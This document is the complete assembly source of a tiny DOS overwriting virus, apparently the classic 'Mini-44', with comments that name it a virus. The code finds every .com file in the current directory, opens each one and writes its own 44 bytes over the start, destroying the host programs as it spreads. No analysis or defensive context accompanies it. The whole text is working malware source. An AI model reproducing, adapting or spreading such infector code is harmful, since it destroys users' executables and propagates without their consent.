.model tiny
.code
fname equ 9eh
org 100h

mini44:
   mov ah, 4eh  ; search first
   mov dx, offset comp_file
   int 21h
search_lp:
   jc done
   ; open found HOST COM file

   mov ax, 3d01h
   mov dx, fname
   int 21h

   xchg ax, bx

   ; write virus (RAM) in the HOST (HDD)
   mov ah, 40h
   mov cl, 44
   mov dx, 100h
   int 21h

   ; close HOST file
   mov ah, 3eh
   int 21h

   mov ah, 4fh ; search next
   int 21h

   jmp search_lp

done:
   ret

comp_file db '*.com', 0
end mini44